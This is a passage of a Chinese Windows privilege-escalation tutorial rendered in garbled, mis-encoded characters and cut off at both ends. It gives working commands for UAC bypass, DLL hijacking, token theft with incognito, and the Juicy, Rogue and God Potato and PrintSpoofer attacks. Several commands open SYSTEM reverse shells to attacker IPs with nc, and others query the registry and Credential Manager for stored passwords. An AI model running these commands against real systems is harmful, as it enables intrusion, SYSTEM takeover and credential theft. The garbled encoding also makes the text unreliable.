DLLåŠ«æŒææƒçš„æ•ˆæœã€‚ md \\\\?\\C:\\Windows md \\\\?\\C:\\Windows \\System32copy C:\\Windows\\System32\\winSTA.exe C:\\Windows \\System32\\winSAT.exe ä½†æ˜¯åˆ¶ä½œDLLçš„æ—¶å€™ï¼Œè¦æ³¨æ„æ¶æ„DLLçš„å¯¼å‡ºå‡½æ•°è¦ä¸è¢«åŠ«æŒçš„DLLä¸€æ ·ã€‚ ä¸“ä¸šåè¯è§£é‡Šï¼šDelegateExecute æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ª COM (Component Object Model) æ¥å£ï¼Œå®ƒé€šå¸¸ä¸åº”ç”¨ç¨‹åºæ‰©å±•å’Œå¤–éƒ¨å¤„ç†ç¨‹åºç›¸å…³ã€‚DelegateExecute æ¥å£å…è®¸ä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–ç»„ä»¶å°†æŸäº›ä»»åŠ¡å§”æ‰˜ç»™å…¶ä»–ç¨‹åºæˆ–å¤„ç†ç¨‹åºæ¥æ‰§è¡Œï¼Œé€šå¸¸æ˜¯ä¸ºäº†å¢å¼ºåŠŸèƒ½æˆ–å®ç°æŸç§å®šåˆ¶åŒ–çš„è¡Œä¸ºã€‚ Manifest æ•°æ®æŒ‡çš„æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºæ¸…å•ï¼ˆApplication Manifestï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨äºæè¿°åº”ç”¨ç¨‹åºç‰¹æ€§ã€ä¾èµ–å…³ç³»ã€æƒé™è¦æ±‚ä»¥åŠå…¶ä»–å…ƒæ•°æ®çš„ XML æ–‡ä»¶ã€‚åº”ç”¨ç¨‹åºæ¸…å•é€šå¸¸é™„åŠ åˆ°åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚ .exe æ–‡ä»¶ï¼‰æˆ–åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰ä¸­ï¼Œä»¥ä¾¿æ“ä½œç³»ç»Ÿå’Œå…¶ä»–ç¨‹åºèƒ½å¤Ÿæ­£ç¡®åœ°è¯†åˆ«å’Œä¸åº”ç”¨ç¨‹åºäº’åŠ¨ã€‚ 4.MSFä¸‹çš„Bypassexploitwindowslocalask #å¼¹å‡ºUACç¡®è®¤çª—å£ï¼Œç‚¹å‡»åè·å¾—systemæƒé™ exploitwindowslocalbypassuac #è¯¥æ¨¡å—è¿è¡Œæ—¶ä¼šå› ä¸ºåœ¨ç›®æ ‡æœºä¸Šåˆ›å»ºå¤šä¸ªæ–‡ä»¶è€Œè¢«æ€æ¯’è½¯ä»¶è¯†åˆ«ï¼Œå› æ­¤é€šè¿‡è¯¥æ¨¡å—ææƒæˆåŠŸç‡å¾ˆä½ã€‚ exploitwindowslocalbypassuac_injection #è¯¥æ¨¡å—ç›´æ¥è¿è¡Œåœ¨å†…å­˜çš„åå°„DLLä¸­ï¼Œæ‰€ä»¥ä¸ä¼šæ¥è§¦ç›®æ ‡æœºå™¨çš„ç¡¬ç›˜ï¼Œä»è€Œé™ä½äº†è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹å‡ºæ¥çš„æ¦‚ç‡ã€‚ exploitwindowslocalbypassuac_fodhelper exploitwindowslocalbypassuac_eventvwr exploitwindowslocalbypassuac_comhijack ä»¤ç‰Œçªƒå–ä»€ä¹ˆæ˜¯ä»¤ç‰Œ ä»¤ç‰Œ(token)æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶ç§˜é’¥ï¼Œç›¸å½“äºè´¦å·å’Œå¯†ç ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ã€‚å®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œè®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºï¼Œè¿™äº›ä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­ï¼Œé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨ã€‚ä»¤ç‰Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éšæœºæ€§ï¼Œä¸å¯é¢„æµ‹ï¼Œé»‘å®¢æˆ–è½¯ä»¶æ— æ³•çŒœæµ‹å‡ºä»¤ç‰Œã€‚ å¯ä»¥é€šè¿‡æ“ä½œä¸€ä¸ªé«˜æƒé™è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œæ¥ å½“åšä¸€ä¸ªè¿›ç¨‹çš„ä»¤ç‰Œã€‚å°±æ˜¯è¯´å·å…¶ä»–è¿›ç¨‹çš„ä»¤ç‰Œæ¥ç”¨ã€‚ç„¶åå°±å¯ä»¥æ‹¥æœ‰é‚£ä¸ªä»¤ç‰Œè‡ªèº«æ‹¥æœ‰çš„æƒé™ã€‚ èƒ½å·å…¶ä»–è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œçš„æ¡ä»¶ï¼šè¯¥ç”¨æˆ·å¿…é¡»æœ‰SeImpersonatePrivilege å’ŒSeAssignPrimaryTokenPrivilegeSeIncreaseQuotaPrivilegeæƒé™ã€‚è€Œè¿™ä¸¤ä¸ªæƒé™çš„ç”¨æˆ·é€šå¸¸æ˜¯ç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·ï¼ŒwebæœåŠ¡è´¦æˆ·ï¼Œå’ŒIIs MsSQLè´¦æˆ·ç­‰ã€‚ 1.ç›´æ¥å·****ä½¿ç”¨incognnito.exeã€‚ä¸Šä¼ åˆ°ä¸»æœºã€‚ incognito.exe list_tokens -u #åˆ—ä¸¾å½“å‰ä¸»æœºä¸Šçš„æ‰€æœ‰è®¿é—®ä»¤ç‰Œincognito.exe execute -c NT AUTHORITY\\SYSTEM whoami#-c å·ä»¤ç‰Œï¼Œwhoami å·å®Œåæ‰§è¡Œçš„å‘½ä»¤incognito.exe execute -c travel-me\\Bob cmdå·åŸŸä¸‹Bobçš„ä»¤ç‰Œï¼Œç„¶åæ‰§è¡Œå®ƒçš„ã€‚ä¹Ÿå°±æ˜¯åˆ‡æ¢åˆ°Bobçš„ç”¨æˆ·ã€‚ 2.MSFå·#msf æ‹¿åˆ°ä¸€ä¸ªä¼šè¯ use incognito #è¿›å…¥incognitoæ¨¡å— list_tokens -u #åˆ—å‡ºä»¤ç‰Œ Delegation Tokenï¼šä¹Ÿå°±æ˜¯æˆæƒä»¤ç‰Œï¼Œå®ƒæ”¯æŒäº¤äº’å¼ç™»å½•(ä¾‹å¦‚å¯ä»¥é€šè¿‡è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®) Impresonation Tokenï¼šæ¨¡æ‹Ÿä»¤ç‰Œï¼Œå®ƒæ˜¯éäº¤äº’çš„ä¼šè¯ã€‚ è¿™é‡Œçªƒå–ä»¤ç‰Œï¼Œä¸»è¦æ˜¯çªƒå–è¿›ç¨‹ä¸­çš„ä»¤ç‰Œ #ä½¿ç”¨ä»¤ç‰Œå‡å†’ç”¨æˆ· impresonate_Token â€œä»¤ç‰Œåâ€ incognitoï¼šexemsfå‡å¯ï¼Œmsfä¸­çš„incognitoæ˜¯ä»windowsä¸­çš„exeæ–‡ä»¶ä¸­ç§»æ¤è¿‡å»çš„ï¼Œè¿™é‡Œä»¥msfè‡ªå¸¦çš„incognitoä¸ºä¾‹ã€‚ é¦–å…ˆæˆ‘ä»¬è¿›å…¥ä¹‹å‰è·å–çš„meterpreter msf5 session 3 meterpreter load incognito åŠ è½½incognitoï¼ˆé™¤äº†incognitoå¤–è¿˜å¯ä»¥åŠ è½½å…¶ä»–æ’ä»¶æ¯”å¦‚mimikatzï¼Œæˆ‘ä»¬ä¹‹åä¼šç”¨åˆ°ï¼‰ meterpreter getuid æŸ¥çœ‹å½“å‰token meterpreter list_tokens -u åˆ—å‡ºå¯ç”¨token meterpreter impersonate_token â€œNT AUTHORITY\\SYSTEMâ€tokençªƒå–ï¼Œæ ¼å¼ä¸ºimpersonate_tokenâ€ä¸»æœºå\\ç”¨æˆ·åâ€ meterpreter getuid æŸ¥çœ‹å½“å‰token meterpreter rev2self è¿”å›ä¹‹å‰çš„token 3.PotatoææƒHot PotatoJuicy Potato.ä»€ä¹ˆæ˜¯ BITS å’Œ CLSIDï¼Ÿ CLSIDæ˜¯æ ‡è¯† COM ç±»å¯¹è±¡çš„å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼UUIDçš„æ ‡è¯†ç¬¦ã€‚ ç¨‹åºå‘˜å’Œç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨åå°æ™ºèƒ½ä¼ è¾“æœåŠ¡ (BITS)ä» HTTP Web æœåŠ¡å™¨å’Œ SMB æ–‡ä»¶å…±äº«ä¸‹è½½æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ åˆ° HTTP Web æœåŠ¡å™¨å’Œ SMB æ–‡ä»¶å…±äº«ã€‚å…³é”®æ˜¯BITå®ç°äº†IMarshalæ¥å£å¹¶å…è®¸ä»£ç†å£°æ˜å¼ºåˆ¶ NTLM èº«ä»½éªŒè¯ã€‚ https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md(CLSID) whoami all whoami priv å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨ -t t å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨ -t u å¦‚æœå‡å¼€å¯ï¼Œå¯ä»¥é€‰æ‹©-t * å¦‚æœå‡æœªå¼€å¯ï¼Œé‚£ä¹ˆæ— æ³•ææƒ è¿™äº›å› ç´ ç›´æ¥å½±å“ä½ èƒ½å¦æ‰¾åˆ°å¯ç”¨çš„ CLSIDï¼Œæ˜¯æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ä¸­çš„å…³é”®ç¯èŠ‚ã€‚ ä¸€ä¸ªæœ‰æ•ˆçš„ CLSID è¿™æ˜¯å®é™…æ“ä½œä¸­æœ€å…·æŒ‘æˆ˜æ€§çš„éƒ¨åˆ†ã€‚ä½ éœ€è¦ä¸ºç‰¹å®šç‰¹å®šç‰ˆæœ¬çš„ Windows ç³»ç»Ÿæ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„ CLSIDã€‚ Juicy Potato å‘å¸ƒæ—¶é™„å¸¦äº†ä¸€ä¸ª CLSID.list.list` æ–‡ä»¶ï¼Œå…¶ä¸­åˆ—å‡ºäº†åœ¨å„ç§ Windows ç‰ˆæœ¬ä¸­æµ‹è¯•è¿‡çš„ CLSIDã€‚ ä½ å¿…é¡»æ ¹æ®ç›®æ ‡ç³»ç»Ÿçš„ç‰ˆæœ¬ï¼Œä»è¿™ä¸ªåˆ—è¡¨ä¸­æŒ‘é€‰å‡ºä¸€ä¸ªæˆ–å¤šä¸ª CLSIDè¿›è¡Œå°è¯•ã€‚ ä¾‹å¦‚ï¼š Windows 10 Server 20162019 å¸¸ç”¨çš„ CLSID å¯èƒ½ä¸ Windows 7 Server 2008 ä¸åŒã€‚ ä¸€ä¸ªå†å²ä¸Šå¹¿æ³›ä½¿ç”¨çš„ CLSID æ˜¯ {4991d34b-80a1-4291-83b6-3328366b9097} (BITSæœåŠ¡)ã€‚ ç³»ç»Ÿæœªæ‰“è¡¥ä¸æˆ–é…ç½®æœªè¢«å¼ºåŒ– å¾®è½¯é€šè¿‡åç»­çš„æ›´æ–°å¯¹è¿™ç±»æ»¥ç”¨ COM æƒé™çš„è¡Œä¸ºè¿›è¡Œäº†é™åˆ¶ï¼ˆå°½ç®¡æ²¡æœ‰å®Œå…¨å°å µï¼‰ã€‚ æŸäº›å®‰å…¨è½¯ä»¶æˆ–ç»„ç­–ç•¥å¯èƒ½ä¼šé˜»æ­¢æœªç»æˆæƒçš„ COM æ¿€æ´»ã€‚ åˆ©ç”¨æµç¨‹ä¸å‚æ•°å¯¹åº”å…³ç³»å½“ä½ è¿è¡Œ Juicy Potato æ—¶ï¼Œè¿™äº›å‰ææ¡ä»¶ç›´æ¥ä½“ç°åœ¨å‘½ä»¤è¡Œå‚æ•°ä¸Šï¼š # ä¸€ä¸ªå…¸å‹çš„ Juicy Potato å‘½ä»¤ç¤ºä¾‹JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c CLSID -c {CLSID}: å¯¹åº”å‰æ #2 å’Œ #å’Œ #4ã€‚ä½ éœ€è¦åœ¨è¿™é‡Œå¡«å…¥ä¸€ä¸ªåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯ç”¨çš„ CLSIDã€‚ **-t ***: å¯¹åº”å‰æ #1ã€‚-t * è¡¨ç¤ºå·¥å…·ä¼šè‡ªåŠ¨å°è¯•ä½¿ç”¨ SeImpersonatePrivilege æˆ– SeAssignPrimaryTokenPrivilegeã€‚ -l 1337: å¯¹åº”å‰æ #3ã€‚æŒ‡å®šä¸€ä¸ªæœ¬åœ°ç›‘å¬ç«¯å£ã€‚ -l port å‚æ•°åªæ˜¯å‘Šè¯‰ Juicy Potato å·¥å…·ï¼šâ€è¯·åœ¨å†…éƒ¨ä½¿ç”¨è¿™ä¸ªç«¯å£æ¥å®Œæˆæƒé™æ¬ºéª—è¿‡ç¨‹â€ã€‚æ‰€æœ‰çš„ç›‘å¬ã€é€šä¿¡ã€ä»¤ç‰Œçªƒå–éƒ½æ˜¯å·¥å…·è‡ªåŠ¨å®Œæˆçš„ï¼Œæ‚¨åªéœ€è¦ååœ¨å½“å‰çš„shellçª—å£ä¸­ç­‰å¾…æ–°çš„ SYSTEM æƒé™çš„ cmd.exe è¿›ç¨‹å¯åŠ¨å³å¯ã€‚ åœ¨ä½ å†³å®šä½¿ç”¨ Juicy Potato ä¹‹å‰ï¼Œè¯·æŒ‰æ­¤æ¸…å•æ£€æŸ¥ï¼š æƒé™æ£€æŸ¥ï¼šè¿è¡Œ whoami /privï¼Œç¡®è®¤è¾“å‡ºä¸­ å·²å¯ç”¨ SeImpersonatePrivilege æˆ– SeAssignPrimaryTokenPrivilegeã€‚ ç³»ç»Ÿè¯†åˆ«ï¼šç¡®å®šç›®æ ‡æœºå™¨çš„ Windows ç‰ˆæœ¬ï¼ˆå¦‚ Win10, Server 2012 R2ç­‰ï¼‰ã€‚ CLSID å‡†å¤‡ï¼šæ ¹æ®ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬ï¼Œä» CLSID.list ä¸­æŒ‘é€‰å‡ ä¸ªå¯èƒ½çš„å€™é€‰ã€‚ æ‰§è¡Œå°è¯•ï¼šä½¿ç”¨ç±»ä¼¼ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œå°è¯•ï¼Œå¦‚æœå¤±è´¥ï¼Œæ›´æ¢ CLSID å†æ¬¡å°è¯•ã€‚ ç¬¬ä¸€æ¬¡å°è¯•ï¼Œä½¿ç”¨ä¸€ä¸ªé’ˆå¯¹ä½ ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬çš„ CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097} å¦‚æœå¤±è´¥ï¼Œå°è¯•å¦ä¸€ä¸ª CLSID JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {XXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX} Rotten Potato(çƒ‚åœŸè±†)æ­¤æŠ€æœ¯ä¸é€‚ç”¨äº Windows 10 1809 å’Œ Windows Server 2019 çš„ç‰ˆæœ¬ 1.é€šè¿‡NT AUTHORITY/SYSTEMè¿è¡Œçš„RPCå°†å°è¯•é€šè¿‡CoGetInstanceFromIStorage APIè°ƒç”¨å‘æˆ‘ä»¬çš„æœ¬åœ°ä»£ç†è¿›è¡Œèº«ä»½éªŒè¯2.135 ç«¯å£çš„RPCå°†ç”¨äºå›å¤ç¬¬ä¸€ä¸ªRPCæ­£åœ¨æ‰§è¡Œçš„æ‰€æœ‰è¯·æ±‚å……å½“æ¨¡æ¿3.AcceptSecurityContextAPIè°ƒç”¨ä»¥åœ¨æœ¬åœ°æ¨¡æ‹ŸNT AUTHORITY/SYSTEM 1. ä½¿ç”¨CoGetInstanceFromIStorage API è°ƒç”¨æ¬ºéª—RPC,å¯¹ä»£ç†è¿›è¡Œèº«ä»½éªŒè¯.åœ¨æ­¤è°ƒç”¨ä¸­æŒ‡å®šäº†ä»£ç† IP/ç«¯å£2. RPC å‘ä»£ç†å‘é€ NTLM åå•†åŒ…3. ä»£ç†ä¾èµ–çš„NTLMåå•†åˆ°RPCåœ¨ç«¯å£135ï¼Œè¢«ç”¨ä½œæ¨¡æ¿ã€‚åŒæ—¶ï¼Œæ‰§è¡Œå¯¹AcceptSecurityContextçš„è°ƒç”¨ä»¥å¼ºåˆ¶è¿›è¡Œæœ¬åœ°èº«ä»½éªŒè¯æ³¨:æ­¤åŒ…è¢«ä¿®æ”¹ä¸ºå¼ºåˆ¶æœ¬åœ°èº«ä»½éªŒè¯.4. 5. RPC 135å’ŒAcceptSecurityContextç”¨NTLM Challengeå›å¤6. å°†ä¸¤ä¸ªæ•°æ®åŒ…çš„å†…å®¹æ··åˆä»¥åŒ¹é…æœ¬åœ°åå•†å¹¶è½¬å‘åˆ°RPC7. RPCä½¿ç”¨å‘é€åˆ°AcceptSecurityContext(8.)çš„NLTM AuthåŒ…è¿›è¡Œå“åº”ï¼Œå¹¶æ‰§è¡Œæ¨¡æ‹Ÿ(9.) Rogue Patato æ”»å‡»æœºå‡†å¤‡ï¼ˆKali æˆ–ä»»æ„ä½ æ§åˆ¶çš„ Linuxï¼‰\\ 1.1 å…ˆæŠŠ 135 ç«¯å£æŠ¢è¿‡æ¥ï¼Œåšè½¬å‘å™¨ sudo socat tcp-listen:135,reuseaddr,fork tcp:é¶æœºIP:9999 1.2 å†èµ·ä¸€ä¸ª nc ç­‰ä¼šæ¥æ”¶ SYSTEM åå‘ Shell nc -nvlp 443 æŠŠæ–‡ä»¶ä¸¢åˆ°é¶æœºåŒä¸€ç›®å½•ï¼ˆè¿™é‡Œç”¨ C:\\tempï¼‰ RoguePotato.exe ï¼ˆGitHub ç›´æ¥ä¸‹ Release å³å¯ ï¼‰ nc64.exe ï¼ˆåè¿è½½ä½“ï¼Œå¯æ¢æˆ msfps ç­‰ payloadï¼‰ é¶æœºä¸€æ¬¡æ‰§è¡Œ C:\\temp\\RoguePotato.exe -r æ”»å‡»æœºIP -l 9999 -e C:\\temp c64.exe æ”»å‡»æœºIP 443 -e cmd.exe å‚æ•°è§£é‡Š -r æ”»å‡»æœº IPï¼ˆsocat æ‰€åœ¨ï¼‰ -l 9999 æœ¬åœ°å‡ OXID è§£æå™¨ç›‘å¬ç«¯å£ï¼Œå¿…é¡»å’Œ socat è½¬å‘å¯¹åº” -e ææƒæˆåŠŸåä»¥ SYSTEM èº«ä»½å¯åŠ¨çš„å‘½ä»¤ï¼ˆè¿™é‡Œç»™ nc åå‘ shellï¼‰ SweetPotato GodPotatoåˆ©ç”¨ç¨‹åºå†…ç½®çš„ Clsid è¿›è¡Œæƒé™æå‡ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ªç®€å•çš„å‘½ä»¤ã€‚ GodPotato -cmd cmd /c whoami æ‰§è¡Œåå‘ shell å‘½ä»¤ GodPotato -cmd nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012 PrintSpooferæ‚¨å¯ä»¥ä½¿ç”¨è¯¥é€‰é¡¹æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯-hã€‚ C:\\TOOLSPrintSpoofer.exe -hPrintSpoofer v0.1 (by @itm4n) Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()Arguments: -c CMD Execute the command *CMD* -i Interact with the new process in the current command prompt (default is non-interactive) -d ID Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta) -h Thats me :)Examples: - Run PowerShell as SYSTEM in the current console PrintSpoofer.exe -i -c powershell.exe - Spawn a SYSTEM command prompt on the desktop of the session 1 PrintSpoofer.exe -d 1 -c cmd.exe - Get a SYSTEM reverse shell PrintSpoofer.exe -c c:\\Temp c.exe 10.10.13.37 1337 -e cmd ç”¨æ³• 1ï¼šå¯åŠ¨ä¸€ä¸ª SYSTEM è¿›ç¨‹å¹¶ä¸ä¹‹äº¤äº’å¦‚æœä½ æœ‰äº¤äº’å¼shellï¼Œä½ å¯ä»¥åœ¨å½“å‰æ§åˆ¶å°ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ SYSTEM è¿›ç¨‹ã€‚ ä½¿ç”¨åœºæ™¯ï¼šç»‘å®š shellã€åå‘ shellpsexec.pyç­‰ã€‚ C:\\TOOLSPrintSpoofer.exe -i -c cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OKMicrosoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system ç”¨æ³• 2ï¼šç”Ÿæˆä¸€ä¸ª SYSTEM è¿›ç¨‹å¹¶é€€å‡ºå¦‚æœä½ å¯ä»¥æ‰§è¡Œå‘½ä»¤ä½†æ²¡æœ‰äº¤äº’å¼ shellï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ SYSTEM è¿›ç¨‹ï¼Œç„¶åç«‹å³é€€å‡ºè€Œä¸ä¸ä¹‹äº¤äº’ã€‚ ä½¿ç”¨åœºæ™¯ï¼šWinRMã€WebShellwmiexec.pyç­‰smbexec.pyã€‚ åˆ›å»ºåå‘ shellï¼š C:\\TOOLSPrintSpoofer.exe -c C:\\TOOLS c.exe 10.10.13.37 1337 -e cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK Netcat ç›‘å¬å™¨ï¼š C:\\TOOLSnc.exe -l -p 1337Microsoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system ç”¨æ³• 3ï¼šåœ¨æ¡Œé¢ä¸Šå¯åŠ¨ SYSTEM è¿›ç¨‹å¦‚æœæ‚¨å·²æœ¬åœ°ç™»å½•æˆ–é€šè¿‡ RDPï¼ˆåŒ…æ‹¬ VDIï¼‰ç™»å½•ï¼Œåˆ™å¯ä»¥åœ¨æ¡Œé¢ä¸Šå¯åŠ¨ SYSTEM å‘½ä»¤æç¤ºç¬¦ã€‚é¦–å…ˆï¼Œä½¿ç”¨å‘½ä»¤æ£€æŸ¥æ‚¨çš„ä¼šè¯ ID qwinstaï¼Œç„¶åä½¿ç”¨é€‰é¡¹æŒ‡å®šæ­¤å€¼-dã€‚ ä½¿ç”¨åœºæ™¯ï¼šç»ˆç«¯ä¼šè¯ï¼ˆRDPï¼‰ã€VDI C:\\TOOLSqwinsta SESSIONNAME USERNAME ID STATE TYPE DEVICE services 0 Disc console Administrator 1 Activerdp-tcp#3 lab-user 3 Active rdp-tcp 65536 ListenC:\\TOOLSPrintSpoofer.exe -d 3 -c powershell -ep bypass[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK å¯†ç ç®¡ç†å‘˜ä¹Ÿä¼šé‡å¤ä½¿ç”¨å¯†ç ï¼Œæˆ–å°†å…¶å¯†ç ä¿ç•™åœ¨ä¸€äº›å¯è¯»ä½ç½®çš„ç³»ç»Ÿä¸Šã€‚ æ³¨å†Œè¡¨å¤§é‡ç¨‹åºåœ¨Windowsæ³¨å†Œè¡¨ä¸­å­˜å‚¨é…ç½®é€‰é¡¹ã€‚Windows æœ¬èº«æœ‰æ—¶ä¼šåœ¨æ³¨å†Œå¤„ä»¥çº¯æ–‡æœ¬å­˜å‚¨å¯†ç ã€‚ æœç´¢æ³¨å†Œè¡¨å¤„çš„å¯†ç (æ‰‹å·¥winPEAS)reg query HKLM /f password /t REG_SZ /s #æœ¬åœ°æœºå™¨æ³¨å†Œè¡¨é¡¹reg query HKCU /f password /t REG_SZ /s #å½“å‰ç”¨æˆ·æ³¨å†Œè¡¨é¡¹ å•å•ç¬¬ä¸€æ¡å‘½ä»¤è¿›è¡Œçš„ HKLM çš„æœç´¢ï¼Œå°±çœ‹åˆ°æ˜¾ç¤ºæœ‰ 293 ä¸ªåŒ¹é…ï¼Œè€Œè¿™ 293 æ¡ç»“æœä¸­è¿˜æœ‰å¾ˆå¤šæ— ç”¨çš„æ•°æ®æœ‰å¾…è®¤ä¸ºåˆ¤æ–­å¤„ç†ã€‚å¯ä»¥çœ‹å‡ºï¼Œè¿™ç§å¹¿æ³›æœç´¢æå…¶çš„è€—è´¹ç²¾åŠ›ï¼ ç›¸åï¼Œæˆ‘ä»¬å¯ä»¥é›†ä¸­ç²¾åŠ›å»æŸ¥çœ‹åŒ…å«å¯†ç çš„å·²çŸ¥æ³¨å†Œè¡¨é¡¹ã€‚è¿™æ ·çš„æ³¨å†Œè¡¨é¡¹æ˜¯ winlogonï¼Œå®ƒä¸ Windows ä¸­è¢«ç§°ä¸º Autologonï¼ˆè‡ªåŠ¨ç™»å½•ï¼‰çš„åŠŸèƒ½ç›¸å…³ã€‚ reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon é™¤äº† Windows è‡ªåŠ¨ç™»å½•åŠŸèƒ½å¤–ï¼ŒæŸäº›ç¨‹åºå’Œç¬¬ä¸‰æ–¹è½¯ä»¶ä¹Ÿå¯èƒ½ä¼šä»¥ä¸å®‰å…¨çš„æ–¹å¼åœ¨æ³¨å†Œè¡¨ä¸­å­˜å‚¨å‡­æ®ï¼Œè¿™äº›ç¬¬ä¸‰æ–¹è½¯ä»¶çš„æ³¨å†Œè¡¨è·¯å¾„å¦‚ä¸‹ reg query â€œHKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMPâ€ reg query â€œHKCU\\Software\\SimonTatham\\PuTTY\\Sessionsâ€ reg query â€œHKCU\\Software\\ORL\\WinVNC3\\Passwordâ€ reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 v password .\\winPEASany.exe quiet filesinfo userinfo å‡­è¯.\\winPEASany.exe quiet cmd windowscreds å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å­˜å‚¨çš„å‡­æ®ï¼š cmdkey /list å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·çš„å‡­è¯å·²ç»å­˜å‚¨åœ¨å‡­è¯ç®¡ç†å™¨ä¸­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥èº«ä»½å€ŸåŠ© runas å‘½ä»¤å»æ‰§è¡Œå‘½ä»¤å•¦ã€‚ å‡­è¯ç®¡ç†å™¨çš„æšä¸¾ï¼Œå¯¹äº PowerUp å’Œ winPEAS æ¥è¯´éƒ½ä¸èƒ½å¤Ÿå¸®åˆ°æˆ‘ä»¬ï¼Œå› æ­¤ï¼Œå‡­è¯ç®¡ç†å™¨çš„æšä¸¾éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œã€‚ã€PEAS è™½ç„¶æ”¯æŒæšä¸¾å­˜å‚¨çš„å‡­è¯ï¼Œä½†ä½¿ç”¨æ•ˆæœä¸ä½³ï¼Œæ€»æ˜¯å¤±è´¥ã€‚ã€‘ è™½ç„¶è¿™å¹¶éçœŸæ­£çš„â€œå¯†ç æœå¯»â€ï¼Œä½†ç”±äºç”¨æˆ·çš„å¯†ç è¢«ä¿å­˜ï¼Œè€Œå®ƒç¡®å®å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›ä»¥å…¶å®ƒç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚å› æ­¤ï¼Œè¿™å®é™…ä¸Šç­‰åŒäºåœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾æŸä¸ªç”¨æˆ·çš„å‡­æ®ã€‚ å¦‚æœå°è¯•è¿è¡Œä»»æ„å‘½ä»¤ï¼ˆä¾‹å¦‚â€œwhoamiâ€ï¼‰æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†è¾“å‡ºå†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶ä»¥è¯»å–å®ƒã€‚è¿™æ˜¯å› ä¸º runas ä¼šåœ¨å¦å¤–æ–°èµ·çš„çª—å£ä¸­å»æ‰§è¡Œå‘½ä»¤ï¼Œå‘½ä»¤æ‰§è¡Œç»“æŸæ–°èµ·çš„çª—å£å°±è¢«å…³é—­äº†ï¼Œå› æ­¤è¾“å‡ºçš„å†…å®¹å¹¶ä¸ä¼šå‘ˆç°åœ¨å½“å‰çš„ shell çª—å£ä¸­ã€‚ runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator cmd.exe /c whoami C:\\temp\\whoami.txt ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç¡®å®æ˜¯ä»¥æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·çš„èº«ä»½è¿è¡Œäº† whoami å‘½ä»¤ï¼æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥ä½¿ç”¨ runas 